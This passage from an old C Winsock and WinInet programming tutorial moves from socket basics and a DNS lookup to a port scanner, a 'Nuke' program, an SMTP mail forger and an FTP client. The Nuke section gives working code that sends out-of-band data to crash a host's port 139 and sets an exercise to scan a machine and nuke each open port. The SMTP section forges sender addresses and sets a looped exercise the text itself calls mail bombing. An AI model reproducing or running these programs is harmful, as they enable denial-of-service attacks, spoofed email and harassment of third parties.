+/* <---- SOURCE CODE ENDS HERE ----> */
+
+
+This program is simple, in the beginning we set up the function outtie,
+this function takes the char, output, and prints it to a file called inet_addr.txt in the C:\ drive.
+
+We go all inet_addr on the IP address 127.0.0.1's ass and put the result in output.
+We then call outtie(); and the result of inet_addr is put into the text file.
+Taadaaaa.
+
+Run this program and click on the client area, wait a second then close it.
+Goto your C:\ drive and open the file inet_addr.txt.
+The file should look something like this
+
+      [ inet_addr.txt ]
+
+Internet Address = 537001100
+
+
+and that is that.
+
+
+5.2 LOOKING AT HTONS()
+=======================================
+
+
+/* <---- SOURCE CODE STARTS HERE ----> */
+
+
+#include <windows.h>
+#include <stdio.h>
+
+     
+long      port;
+char      output[200];
+
+LRESULT CALLBACK recall (HWND, UINT, WPARAM, LPARAM);
+
+int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
+
+{
+      static TCHAR szAppName[] = TEXT("Interface");
+
+      HWND      	hwnd;
+      MSG      	msg;
+      WNDCLASS      wndclass;
+
+
+      wndclass.style      	= CS_HREDRAW | CS_VREDRAW;
+      wndclass.lpfnWndProc    = recall;
+      wndclass.cbClsExtra     = 0;
+      wndclass.cbWndExtra     = 0;
+      wndclass.hInstance      = hInstance;
+      wndclass.hIcon      	= LoadIcon (NULL, IDI_APPLICATION);
+      wndclass.hCursor      	= LoadCursor (NULL, IDC_ARROW);
+      wndclass.hbrBackground  = (HBRUSH) GetStockObject (WHITE_BRUSH);
+      wndclass.lpszMenuName   = NULL;
+      wndclass.lpszClassName  = "Interface";
+      
+      RegisterClass (&wndclass);
+
+      hwnd = CreateWindow (szAppName,      	// Windows Class Name
+      	      	 "Interface",      	// Windows Caption
+      	      	 WS_OVERLAPPEDWINDOW,   // Windows Style
+      	      	 CW_USEDEFAULT,      	// initial x position
+      	      	 CW_USEDEFAULT,      	// initial y position
+      	      	 200,      	      	// initial x size
+      	      	 200,      	      	// initial y size
+      	      	 0,      	      	// parent window handle
+      	      	 0,      	      	// parent menu handle
+      	      	 hInstance,      	      // program instance handle
+      	      	 0);      	      	// creation parameters
+
+
+      ShowWindow(hwnd, iCmdShow);
+
+      while (GetMessage (&msg, NULL, 0, 0))
+      {
+      	DispatchMessage  (&msg);
+      }
+      return 1;
+}
+
+
+LRESULT CALLBACK recall (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
+{
+if (message == WM_LBUTTONDOWN)
+{   
+
+      port = htons(80);
+
+
+    sprintf(output,"Port 80 = %ld",port);
+    MessageBox(0,output,"Port",0);
+                     
+
+}
+
+
+      if (message == WM_DESTROY)
+      	PostQuitMessage(0);
+
+      return DefWindowProc(hwnd, message, wParam, lParam);
+}
+
+
+/* <---- SOURCE CODE ENDS HERE ----> */
+
+
+This program is very similiar to the last one but this one looks at htons() rather than inet_addr.
+Here we have chosen to display the result in a messagebox tough rather than a text file.
+
+The result should be a message box with caption, "Port" and text saying Port 80 = 20480.
+
+
+5.3 EXPLORING WINSOCK FUNCTIONS
+=======================================
+
+
+/* <---- SOURCE CODE STARTS HERE ----> */
+
+
+#include <windows.h>
+#include <stdio.h>
+ 
+WSADATA  ws;
+DWORD    wsock;
+
+char       msge[200];
+
+
+LRESULT CALLBACK recall (HWND, UINT, WPARAM, LPARAM);
+
+int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
+
+{
+      static TCHAR szAppName[] = TEXT("Interface");
+
+      HWND      	hwnd;
+      MSG      	msg;
+      WNDCLASS      wndclass;
+
+      wndclass.style      	= CS_HREDRAW | CS_VREDRAW;
+      wndclass.lpfnWndProc    = recall;
+      wndclass.cbClsExtra     = 0;
+      wndclass.cbWndExtra     = 0;
+      wndclass.hInstance      = hInstance;
+      wndclass.hIcon      	= LoadIcon (NULL, IDI_APPLICATION);
+      wndclass.hCursor      	= LoadCursor (NULL, IDC_ARROW);
+      wndclass.hbrBackground  = (HBRUSH) GetStockObject (WHITE_BRUSH);
+      wndclass.lpszMenuName   = NULL;
+      wndclass.lpszClassName  = "Interface";
+      
+
+      RegisterClass (&wndclass);
+
+      hwnd = CreateWindow (szAppName,      	// Windows Class Name
+      	      	 "Interface",      	// Windows Caption
+      	      	 WS_OVERLAPPEDWINDOW,   // Windows Style
+      	      	 CW_USEDEFAULT,      	// initial x position
+      	      	 CW_USEDEFAULT,      	// initial y position
+      	      	 200,      	      	// initial x size
+      	      	 200,      	      	// initial y size
+      	      	 0,      	      	// parent window handle
+      	      	 0,      	      	// parent menu handle
+      	      	 hInstance,      	      // program instance handle
+      	      	 0);      	      	// creation parameters
+
+
+      ShowWindow(hwnd, iCmdShow);
+
+      while (GetMessage (&msg, NULL, 0, 0))
+      {
+      	DispatchMessage  (&msg);
+      }
+      return 1;
+
+}
+
+
+LRESULT CALLBACK recall (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
+{
+if (message == WM_LBUTTONDOWN)
+{
+
+      wsock = WSAStartup(0x0101,&ws);
+
+      sprintf(msge,"wsock..%ld",wsock);
+      MessageBox(0,msge,msge,0);
+
+      sprintf(msge,"wVersion....%d",ws.wVersion);
+      MessageBox(0,msge,msge,0);
+
+      sprintf(msge,"wHighVersion....%d",ws.wHighVersion);
+      MessageBox(0,msge,msge,0);
+
+      sprintf(msge,"szDescription....%s",&ws.szDescription);
+      MessageBox(0,msge,msge,0);
+
+      sprintf(msge,"szSystemStatus....%s",&ws.szSystemStatus);
+      MessageBox(0,msge,msge,0);
+
+      sprintf(msge,"iMaxSockets....%u",ws.iMaxSockets);
+      MessageBox(0,msge,msge,0);
+
+      sprintf(msge,"iMaxUdpDg....%u",ws.iMaxUdpDg);
+      MessageBox(0,msge,msge,0);
+
+      sprintf(msge,"lpVendorInfo....%s",ws.lpVendorInfo);
+      MessageBox(0,msge,msge,0);
+
+      MessageBox(0,"Finished","End",0);
+
+      WSACleanup();
+
+}
+
+      if (message == WM_DESTROY)
+      	PostQuitMessage(0);
+
+      return DefWindowProc(hwnd, message, wParam, lParam);
+}
+
+
+/* <---- SOURCE CODE ENDS HERE ----> */
+
+
+
+This program calls several functions of winsock and displays the results to us in message box's.
+These can be handy if, for example I wanted to tell some-1 what version of winsock there running I
+would call &ws.szDescription which in my case would say Winsock 2.0, in a nicely human readable value.
+
+
+
+[ EXERCISES ]
+
+Look trough the file winsock.h in your compiler include folder. See what else there is in winsock
+that can be demonstrated in these kinds of programs.
+
+________________________________________________________________________________________________________
+
+6.0 Common Internet programs
+=======================================
+
+In this section were going to build a few common internet applications using the information that
+we have learnt so far.
+
+These programs are:
+
+1. DNS      	-  Gets a hostname and returns its IP address.
+2. Portscan      	-  Gets port numbers and tells user whether there open or not.
+3. Nuke      	-  Sends OOB data to a listening port.
+
+
+
+6.1 DNS
+=======================================
+
+
+/* <---- SOURCE CODE STARTS HERE ----> */
+
+#include <windows.h>
+#include <tchar.h>
+#include <stdio.h>
+
+int CDECL MessageBoxPrintf (TCHAR * szCaption, TCHAR * szFormat, ...)
+{
+      TCHAR      szBuffer [1024];
+      va_list pArgList;
+
+      va_start (pArgList, szFormat);
+
+      _vsntprintf (szBuffer, sizeof (szBuffer) / sizeof (TCHAR),
+      	      szFormat, pArgList);
+
+      va_end (pArgList);
+
+      return MessageBox (NULL, szBuffer, szCaption, 0);
+
+}
+
+          WSADATA  wsdata;
+      SOCKET   sock; 
+      DWORD    wsock;
+
+LRESULT CALLBACK recall (HWND, UINT, WPARAM, LPARAM);
+
+int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
+
+{
+      static TCHAR szAppName[] = TEXT("Interface");
+
+      HWND      	hwnd;
+      MSG      	msg;
+      WNDCLASS      wndclass;
+
+      wndclass.style      	= CS_HREDRAW | CS_VREDRAW;
+      wndclass.lpfnWndProc    = recall;
+      wndclass.cbClsExtra     = 0;
+      wndclass.cbWndExtra     = 0;
+      wndclass.hInstance      = hInstance;
+      wndclass.hIcon      	= LoadIcon (NULL, IDI_APPLICATION);
+      wndclass.hCursor      	= LoadCursor (NULL, IDC_ARROW);
+      wndclass.hbrBackground  = (HBRUSH) GetStockObject (WHITE_BRUSH);
+      wndclass.lpszMenuName   = NULL;
+      wndclass.lpszClassName  = "Interface";
+      
+      RegisterClass (&wndclass);
+
+      hwnd = CreateWindow (szAppName,      	// Windows Class Name
+      	      	 "Interface",      	// Windows Caption
+      	      	 WS_OVERLAPPEDWINDOW,   // Windows Style
+      	      	 CW_USEDEFAULT,      	// initial x position
+      	      	 CW_USEDEFAULT,      	// initial y position
+      	      	 200,      	      	// initial x size
+      	      	 200,      	      	// initial y size
+      	      	 0,      	      	// parent window handle
+      	      	 0,      	      	// parent menu handle
+      	      	 hInstance,      	      // program instance handle
+      	      	 0);      	      	// creation parameters
+
+
+      ShowWindow(hwnd, iCmdShow);
+
+      while (GetMessage (&msg, NULL, 0, 0))
+      {
+      	DispatchMessage  (&msg);
+      }
+      return 1;
+
+}
+
+
+LRESULT CALLBACK recall (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
+{
+if (message == WM_LBUTTONDOWN)
+{
+
+ wsock = WSAStartup(0x0101,&wsdata);
+ struct hostent *h;
+
+
+ h = gethostbyname("localhost");
+
+
+ MessageBoxPrintf(TEXT ("Hostname"),h->h_name);
+
+ MessageBoxPrintf(TEXT ("IP Address"),inet_ntoa(*((struct in_addr *)h->h_addr)));
+ 
+
+
+ WSACleanup();
+
+}
+
+      if (message == WM_DESTROY)
+      	PostQuitMessage(0);
+
+      return DefWindowProc(hwnd, message, wParam, lParam);
+}
+
+
+/* <---- SOURCE CODE ENDS HERE ----> */
+
+
+
+This program utilizes the hostent structure, like we discussed earlier, and uses the gethostbyname();
+function to get the name of the host were looking for.
+
+The hostent structure is filled up and we access the members h_name and h_addr and display them in Messagebox's.
+
+These aren't normal message box's as normal ones wouldn't be able to display the info for them so we added
+some extra code to create MessageBoxPrintf(); to emulate the consoles printf() function.
+
+
+
+6.2 Portscan
+=======================================
+
+
+/* <---- SOURCE CODE STARTS HERE ----> */
+
+
+#include <windows.h>
+#include <stdio.h>
+
+
+int CheckPortUDP(short int Port)
+{
+    struct sockaddr_in client;
+
+    WSADATA wsaData;
+
+    int Busy = 0;
+    int sock;
+
+    if(WSAStartup(0x0101, &wsaData) == 0)
+    {
+
+        client.sin_family      = AF_INET;
+        client.sin_port        = htons(Port);
+        client.sin_addr.s_addr = inet_addr("127.0.0.1");
+
+        /* Check UDP Protocol */
+        sock = socket(AF_INET, SOCK_DGRAM, 0);
+
+        Busy = (bind(sock, (SOCKADDR FAR *) &client,sizeof(SOCKADDR_IN)) == SOCKET_ERROR);
+
+
+        if(Busy)
+
+        WSACleanup();
+    }
+    return(Busy);
+}
+
+
+int CheckPortTCP(short int Port)
+{
+    struct sockaddr_in client;
+
+    WSADATA wsaData;
+
+    int Busy = 0;
+    int sock;
+
+    if(WSAStartup(0x0101, &wsaData) == 0)
+    {
+
+        client.sin_family      = AF_INET;
+        client.sin_port        = htons(Port);
+        client.sin_addr.s_addr = inet_addr("127.0.0.1");
+
+        sock = socket(AF_INET, SOCK_STREAM, 0);
+
+        Busy = (connect(sock, (struct sockaddr *) &client,sizeof(client)) == 0);
+
+
+        if(Busy)
+
+        WSACleanup();
+    }
+
+    return(Busy);
+}
+
+
+
+
+LRESULT CALLBACK recall (HWND, UINT, WPARAM, LPARAM);
+
+int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
+
+{
+      static TCHAR szAppName[] = TEXT("Interface");
+
+      HWND      	hwnd;
+      MSG      	msg;
+      WNDCLASS      wndclass;
+
+      wndclass.style      	= CS_HREDRAW | CS_VREDRAW;
+      wndclass.lpfnWndProc    = recall;
+      wndclass.cbClsExtra     = 0;
+      wndclass.cbWndExtra     = 0;
+      wndclass.hInstance      = hInstance;
+      wndclass.hIcon      	= LoadIcon (NULL, IDI_APPLICATION);
+      wndclass.hCursor      	= LoadCursor (NULL, IDC_ARROW);
+      wndclass.hbrBackground  = (HBRUSH) GetStockObject (WHITE_BRUSH);
+      wndclass.lpszMenuName   = NULL;
+      wndclass.lpszClassName  = "Interface";
+      
+      RegisterClass (&wndclass);
+
+      hwnd = CreateWindow (szAppName,      	// Windows Class Name
+      	      	 "Interface",      	// Windows Caption
+      	      	 WS_OVERLAPPEDWINDOW,   // Windows Style
+      	      	 CW_USEDEFAULT,      	// initial x position
+      	      	 CW_USEDEFAULT,      	// initial y position
+      	      	 200,      	      	// initial x size
+      	      	 200,      	      	// initial y size
+      	      	 0,      	      	// parent window handle
+      	      	 0,      	      	// parent menu handle
+      	      	 hInstance,      	      // program instance handle
+      	      	 0);      	      	// creation parameters
+
+
+      ShowWindow(hwnd, iCmdShow);
+
+      
+
+    if(CheckPortTCP(80))
+
+        MessageBox(0,"HTTP Server is running","HTTP",0);
+    else
+        MessageBox(0,"HTTP Server is down","HTTP",0);
+
+
+    if(CheckPortUDP(13))
+
+        MessageBox(0,"DayTime Server is running","DayTime",0);
+    else
+        MessageBox(0,"DayTime Server is down","DayTime",0);
+
+
+
+      while (GetMessage (&msg, NULL, 0, 0))
+      {
+      	DispatchMessage  (&msg);
+      }
+      return 1;
+
+}
+
+
+LRESULT CALLBACK recall (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
+{
+      if (message == WM_DESTROY)
+      	PostQuitMessage(0);
+
+      return DefWindowProc(hwnd, message, wParam, lParam);
+}
+
+
+/* <---- SOURCE CODE ENDS HERE ----> */
+
+
+
+Unlike the previous programs this one runs the winsock code as soon as we start it. We have 2 functions,
+
+1. CheckPortUDP      -  Check if UDP port is open.
+2. CheckPortTCP       -  Check if TCP port is open.
+
+These functions try to connect to the port that we pass to them in the WinMain function and if these ports
+are busy we get returned Busy otherwise we dont get returned Busy, its as easy as that!
+If we wanted we could add more code that checks more ports, port checking could do more than just tell us
+if a server is running (which is very useful on its own!) it could also tell us if a trojan is running
+on a remote computer or our own for that matter :).
+
+
+6.3 Nuker
+=======================================
+
+
+/* <---- PLEASE READ DISCLAIMER  ----> */
+/* <---- SOURCE CODE STARTS HERE ----> */
+
+
+#include <windows.h>
+#include <stdio.h>
+
+ 
+    WSADATA        wsdata;
+    SOCKET         sock; 
+    DWORD          wsock;
+    char      	*str;
+    struct         sockaddr_in Sa;
+
+
+
+LRESULT CALLBACK recall (HWND, UINT, WPARAM, LPARAM);
+
+int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
+
+{
+      static TCHAR szAppName[] = TEXT("Interface");
+
+      HWND      	hwnd;
+      MSG      	msg;
+      WNDCLASS    wndclass;
+
+      wndclass.style      	= CS_HREDRAW | CS_VREDRAW;
+      wndclass.lpfnWndProc    = recall;
+      wndclass.cbClsExtra     = 0;
+      wndclass.cbWndExtra     = 0;
+      wndclass.hInstance      = hInstance;
+      wndclass.hIcon      	= LoadIcon (NULL, IDI_APPLICATION);
+      wndclass.hCursor      	= LoadCursor (NULL, IDC_ARROW);
+      wndclass.hbrBackground  = (HBRUSH) GetStockObject (WHITE_BRUSH);
+      wndclass.lpszMenuName   = NULL;
+      wndclass.lpszClassName  = "Interface";
+      
+      RegisterClass (&wndclass);
+
+      hwnd = CreateWindow (szAppName,      	// Windows Class Name
+      	      	 "Interface",      	// Windows Caption
+      	      	 WS_OVERLAPPEDWINDOW,   // Windows Style
+      	      	 CW_USEDEFAULT,      	// initial x position
+      	      	 CW_USEDEFAULT,      	// initial y position
+      	      	 200,      	      	// initial x size
+      	      	 200,      	      	// initial y size
+      	      	 0,      	      	// parent window handle
+      	      	 0,      	      	// parent menu handle
+      	      	 hInstance,      	      // program instance handle
+      	      	 0);      	      	// creation parameters
+
+      ShowWindow(hwnd, iCmdShow);
+
+      while (GetMessage (&msg, NULL, 0, 0))
+      {
+      	DispatchMessage  (&msg);
+      }
+      return 1;
+
+}
+
+
+LRESULT CALLBACK recall (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
+{
+      if (message == WM_LBUTTONDOWN)
+      {
+      wsock = WSAStartup(0x0101,&wsdata);
+
+      sock = socket(PF_INET,SOCK_STREAM,0);
+
+      Sa.sin_family = AF_INET;
+      Sa.sin_addr.s_addr = inet_addr("127.0.0.1");
+      Sa.sin_port = htons(139);
+
+      wsock = connect(sock,(struct sockaddr *)&Sa,sizeof(Sa));
+
+      str = "Hello World!";
+
+      send(sock,str,strlen(str),MSG_OOB);
+
+      MessageBox(0,"Nuke Sent","Nuked",0);
+      WSACleanup();
+
+      }
+
+      if (message == WM_DESTROY)
+      	PostQuitMessage(0);
+
+      return DefWindowProc(hwnd, message, wParam, lParam);
+}
+
+
+/* <---- SOURCE CODE ENDS HERE ----> */
+
+
+This is the infamous (infamously lame) Nuke program. Port 139 is standard listening port for windows,
+Nuke merely sends OOB (Out Of Bound) data to this port which on some operating systems results in a crash.
+Many FTP servers and other such services are subceptible to a good nuking, all you do is change the port 
+value to the service you wish to crash.
+
+For more information on Nuke and DoS attacks consult blacksun.box.sk.
+
+
+[ EXERCISES ]
+
+Write a program which first takes a hostname of a computer and returns the IP address, 
+checks for open ports on the host, and nukes each port in turn.
+
+
+________________________________________________________________________________________________________
+
+
+7.0 E-MAIL - SMTP
+=======================================
+
+E-Mail is a very useful service and has made snail mail pointless (id rather get an internet mail bomb than
+a snail mail one!)
+
+E-mail is made up of two protocols
+
+1. SMTP      	-  For sending mail.
+2. POP3      	-  For recieving mail.
+
+
+Since this is a basics tutorial we will only cover SMTP for the moment but that don't mean that we can't
+make it a bit more interesting...
+
+Any-1 thats familiar with SMTP can tell you its inherent flaws (after all bsrf's tutorial is smtp - the 
+buggiest protocol..  or something like that).
+
+Most importantly of all it is possible to send mail from your e-mail account without giving a username or
+password, or read some-1 else's mail for that matter..
+
+
+
+/* <---- SOURCE CODE STARTS HERE ----> */
+
+#include <windows.h>
+#include <stdio.h>
+
+
+    WSADATA         wsdata;
+    SOCKET          sock;
+    DWORD           wsock;
+      
+    struct          hostent *H;
+    char            output[100];
+    int      	  cnnct;
+    char            str[10000];
+    struct          sockaddr_in Sa;
+
+
+LRESULT CALLBACK recall (HWND, UINT, WPARAM, LPARAM);
+
+int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
+{
+      	static TCHAR szAppName[] = TEXT("Interface");
+
+
+      HWND      	hwnd;
+      MSG      	msg;
+      WNDCLASS      wndclass;
+
+      wndclass.style      	      = CS_HREDRAW | CS_VREDRAW;
+      wndclass.lpfnWndProc      	= recall;
+      wndclass.cbClsExtra      	= 0;
+      wndclass.cbWndExtra      	= 0;
+      wndclass.hInstance      	= hInstance;
+      wndclass.hIcon      	      = LoadIcon (NULL, IDI_APPLICATION);
+      wndclass.hCursor      	      = LoadCursor (NULL, IDC_ARROW);
+      wndclass.hbrBackground      	= (HBRUSH) GetStockObject (WHITE_BRUSH);
+      wndclass.lpszMenuName      	= NULL;
+      wndclass.lpszClassName      	= "Interface";
+      
+      RegisterClass (&wndclass);
+
+      hwnd = CreateWindow (szAppName,      	// Windows Class Name
+      	      	 "Interface",      	// Windows Caption
+      	      	 WS_OVERLAPPEDWINDOW,   // Windows Style
+      	      	 CW_USEDEFAULT,      	// initial x position
+      	      	 CW_USEDEFAULT,      	// initial y position
+      	      	 200,      	      	// initial x size
+      	      	 200,      	      	// initial y size
+      	      	 0,      	      	// parent window handle
+      	      	 0,      	      	// parent menu handle
+      	      	 hInstance,      	      // program instance handle
+      	      	 0);      	      	// creation parameters
+
+
+      ShowWindow(hwnd, iCmdShow);
+
+
+      while (GetMessage (&msg, NULL, 0, 0))
+      {
+      	DispatchMessage  (&msg);
+      }
+      return 1;
+}
+
+
+
+LRESULT CALLBACK recall (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
+{
+      if (message == WM_LBUTTONDOWN)
+    {
+      
+  WSAStartup (0x101, &wsdata);
+  
+  sock = socket(AF_INET, SOCK_STREAM,0);
+
+  H = gethostbyname("mail.newbie.net");
+
+  Sa.sin_family           = AF_INET;
+  Sa.sin_port           = htons(25);
+  Sa.sin_addr.s_addr       = *((unsigned long *) H->h_addr);
+
+  cnnct = connect(sock,(struct sockaddr *) &Sa,sizeof(Sa));
+  
+  cnnct = recv(sock,str,10000,0);
+
+  sprintf(output,"recv %d str %s",cnnct,str);
+
+
+  strset(output,' ');
+  strcpy(str,"HELO newbie.net\r\n");
+  
+  cnnct = send(sock,str,strlen(str),0);
+  
+  cnnct = recv(sock,str,10000,0);
+
+  sprintf(output,"recv %d str %s",cnnct,str);
+
+
+  strset(output,' ');
+  
+  strcpy(str,"MAIL FROM:<lamer@newbie.net>\r\n");
+  cnnct = send(sock,str,strlen(str),0);
+  
+  cnnct = recv(sock,str,10000,0);
+
+  sprintf(output,"recv %d str %s",cnnct,str);
+
+
+  strset(output,' ');
+  
+  strcpy(str,"RCPT  TO:<cos125@hotmail.com>\r\n");
+  cnnct = send(sock,str,strlen(str),0);
+  
+  cnnct = recv(sock,str,10000,0);
+
+  sprintf(output,"recv %d str %s",cnnct,str);
+
+
+  strset(output,' ');
+  
+  strcpy(str,"DATA\r\n");
+  cnnct = send(sock,str,strlen(str),0);
+  
+  cnnct = recv(sock,str,10000,0);
+
+  sprintf(output,"recv %d str %s",cnnct,str);
+
+
+  strset(output,' ');  
+  
+  strcpy(str,"TO: Ian Cosgrove\r\n");
+  cnnct = send(sock,str,strlen(str),0);
+  
+  strcpy(str,"FROM: Mail Forger.in\r\n");
+  cnnct = send(sock,str,strlen(str),0);
+  
+  strcpy(str,"DATE: 22 May 01 16:17 GMT\r\n");
+  cnnct = send(sock,str,strlen(str),0);
+  
+  strcpy(str,"MESSAGE_ID: <123456789>\r\n");
+  cnnct = send(sock,str,strlen(str),0);
+  
+  strcpy(str,"Hello World!\r\n");
+  cnnct = send(sock,str,strlen(str),0);
+  
+  strcpy(str,"From The Mail Forge Program\r\n");
+  cnnct = send(sock,str,strlen(str),0);
+  
+  strcpy(str,".\r\n");
+  cnnct = send(sock,str,strlen(str),0);
+  
+  cnnct = recv(sock,str,10000,0);
+
+  sprintf(output,"recv %d str %s",cnnct,str);
+
+
+  strset(output,' ');
+  
+  strcpy(str,"QUIT\r\n");
+  cnnct = send(sock,str,strlen(str),0);
+  
+  cnnct = recv(sock,str,10000,0);
+
+  sprintf(output,"recv %d str %s",cnnct,str);
+
+  WSACleanup();
+  
+}
+
+
+      if (message == WM_DESTROY)
+      	PostQuitMessage(0);
+
+      return DefWindowProc(hwnd, message, wParam, lParam);
+}
+
+
+
+/* <---- SOURCE CODE ENDS HERE ----> */
+
+
+This program sends a series of commands at the SMTP server, if you are not familiar with the smtp
+protocol theres a good tutorial at the blacksun website which covers all of these commands and
+the basic idea behind this program.
+
+The result of this program is that an e-mail is sent to my e-mail address (cos125@hotmail.com),
+from lamer@newbie.net.
+
+The resulting e-mail would look like the following:
+
+---------------------------
+---------------------------
+TO:   Ian Cosgrove
+FROM: Mail Forger
+DATE: 22 May 01 16:17 GMT
+
+MESSAGE_ID: <123456789>
+
+Hello World!
+From The Mail Forge Program
+---------------------------
+---------------------------
+
+
+And thats the SMTP program, replace my e-mail address with any-1 that you want and the address,
+lamer@newbie.net with anything, like santa@northpole.com, and the e-mail will be sent.
+
+
+
+[ EXERCISES ]
+
+Add a loop in the program so that it repeatedly sends e-mails to the same address...
+
+something like,
+
+for (i = 1; i<= 500 ; z++)
+{
+...
+}
+
+________________________________________________________________________________________________________
+
+* NOTE -  This method is known as mail bombing.
+
+________________________________________________________________________________________________________
+
+
+8.0 WinInet - FTP
+=======================================
+
+
+So far we have been using the Winsock for all of our programming, but there is another option in windows
+and its known as WinInet. WinInet is a collection of high level functions and deals with 3 main protocols;
+HTTP, FTP and Gopher. WinInet functions closely resemble windows file functions. For an example of using
+the WinInet API we are going to make an FTP client.
+
+FTP isn't very widely used anymore or if it is its used in the background of an application, like for 
+downloading files from an FTP server in Internet Explorer. To the user when Internet Explorer begins 
+downloading a file from a web site its hard to tell whether its using http's get command or using good ol' FTP.
+
+
+      +------------------------+-------------------------+
+      |     FTP function       |  Windows File Function  |
+      +------------------------+-------------------------+
+      | FtpCreateDirectory     | CreateDirectory         |
+      +------------------------+-------------------------+
+      | FtpRemoveDirectory     | RemoveDirectory         |
+      +------------------------+-------------------------+
+      | FtpSetCurrentDirectory | SetCurrentDirectory     |
+      +------------------------+-------------------------+
+      | FtpGetCurrentDirectory | GetCurrentDirectory     |
+      +------------------------+-------------------------+
+
+
+      FIG 5. - FTP and Windows File functions.
+
+
+As you can see from the above diagram FTP's commands in WinInet are very similiar to normal file commands 
+in windows. This should make it easier to understand if you are already familiar with file management in windows.
+
+
+
+/* <---- SOURCE CODE STARTS HERE ----> */
+
+
+#include <windows.h>
+#include <wininet.h>  // remember to include the WinInet header
+#include <stdio.h>
+
+// FTP Download Definitions
+
+LRESULT CALLBACK recall (HWND, UINT, WPARAM, LPARAM);
+
+int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
+
+{
+      static TCHAR szAppName[] = TEXT("Interface");
+
+      HWND      	hwnd;
+      MSG      	msg;
+      WNDCLASS      wndclass;
+
+      wndclass.style      	      = CS_HREDRAW | CS_VREDRAW;
+      wndclass.lpfnWndProc      	= recall;
+      wndclass.cbClsExtra      	= 0;
+      wndclass.cbWndExtra      	= 0;
+      wndclass.hInstance      	= hInstance;
+      wndclass.hIcon      	      = LoadIcon (NULL, IDI_APPLICATION);
+      wndclass.hCursor      	      = LoadCursor (NULL, IDC_ARROW);
+      wndclass.hbrBackground      	= (HBRUSH) GetStockObject (WHITE_BRUSH);
+      wndclass.lpszMenuName      	= NULL;
+      wndclass.lpszClassName      	= "Interface";
+      
+      RegisterClass (&wndclass);
+
+      hwnd = CreateWindow (szAppName,      	// Windows Class Name
+      	      	 "Interface",      	// Windows Caption
+      	      	 WS_OVERLAPPEDWINDOW,   // Windows Style
+      	      	 CW_USEDEFAULT,      	// initial x position
+      	      	 CW_USEDEFAULT,      	// initial y position
+      	      	 200,      	      	// initial x size
+      	      	 200,      	      	// initial y size
+      	      	 0,      	      	// parent window handle
+      	      	 0,      	      	// parent menu handle
+      	      	 hInstance,      	      // program instance handle
+      	      	 0);      	      	// creation parameters
+
+
+      ShowWindow(hwnd, iCmdShow);
+
+      while (GetMessage (&msg, NULL, 0, 0))
+      {
+      	DispatchMessage  (&msg);
+      }
+      return 1;
+
+}
+
+LRESULT CALLBACK recall (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
+{
+      if (message == WM_LBUTTONDOWN)
+      {
+
+      BOOL      	bSuccess;
+      HINTERNET      hIntSession, hFtpSession;
+
+
+      // Open an internet session
+
+       hIntSession = ::InternetOpen ("FTP", INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, INTERNET_FLAG_ASYNC);
+
+      // form a connection to www.microsoft.com
+
+       hFtpSession = InternetConnect (hIntSession, "www.microsoft.com", 
+      	INTERNET_DEFAULT_FTP_PORT, "anonymous", "cos125@hotmail.com", 
+      	INTERNET_SERVICE_FTP, 0, 0);
+
+      bSuccess = FtpSetCurrentDirectory( hFtpSession, "");       // Set the current directory on the ftp server, 
+      	      	      	                 // where "" is the directory
+
+      // Copy file from internet
+
+      FtpGetFile (hFtpSession,
+      	      	"/disclaimer.txt", "/disclaimer.txt", TRUE,       	// copy file from server to disk
+      	      	FILE_ATTRIBUTE_NORMAL, FTP_TRANSFER_TYPE_ASCII, 0);
+
+
+      InternetCloseHandle (hFtpSession);
+      InternetCloseHandle (hIntSession);
+
+
+      }
+
+      if (message == WM_DESTROY)
+      	PostQuitMessage(0);
+
+      return DefWindowProc(hwnd, message, wParam, lParam);
+}
+
+
+
+/* <---- SOURCE CODE ENDS HERE ----> */
+
+
+This program is quiet different to ones we have seen before. Most importantly to run this one you must 
+link WININET.LIB to the project rather than Wsock32.lib, otherwise you'll get linker errors from your compiler.
+
+The main code is in the button down part as usual, to keep things familiar. In the begining we have a BOOL 
+and two important parts which deal with the session. hIntSession and hFtpSession. These are used to refer to 
+the connection to the host which in this case is www.microsoft.com.
+
+We pass several parameters to InternetOpen, first the name of the app "FTP", then the we just worry about 
+standard parts like the internet type and ASyncronous.
+
+With InternetConnect we really form the connection by specifying information such as the host name, 
+"www.microsoft.com" and tell the program to use the standard FTP port which is port 21, and provide the login 
+information required by the ftp server. We are logging in with the standard anonymous account available on all 
+public ftp servers. If you are connecting to a computer you have an account on you replace anonymous with your 
+username and cos125@hotmail.com with your password.We then tell it what service we are using, ie; FTP.
+
+
+We set the current directory we wish to use on the FTP server, "" for the default directory, if a directory 
+called home existed on the ftp server we could switch to that directory by placing home in the quotation marks, 
+"home", and we pass a handle to the current ftp session, hFtpSession.
+
+The FtpGetFile() functions structure is quiet similiar, we specify the handle then give the name of the file we 
+wish to download, this is followed by the name we want for the file when it is downloaded onto the computer. 
+If I wanted to download disclaimer.txt onto my computer and have its name as discoblah.txt when it got here i 
+would set the first of these parameters to disclaimer.txt and the second one to discoblah.txt.
+
+We set the files attributes to normal and then we specify the transfer type.
+Files from FTP servers can be downloaded in more than one way, ascii or binary. We are only downloading an ascii 
+text file right now so we set it to FTP_TRANSFER_TYPE_ASCII, however if we wanted a binary transmission, like we 
+would for a computer program, we would set it to FTP_TRANSFER_TYPE_BINARY.
+
+To finish off we close the handles hFtpSession and hIntSession.
+
+
+
+[ EXCERCISES ]
+
+Write a program which uses multiple threads or ASynchronous sockets to simultaneously download multiple files 
+from a server using a binary transfer.
+
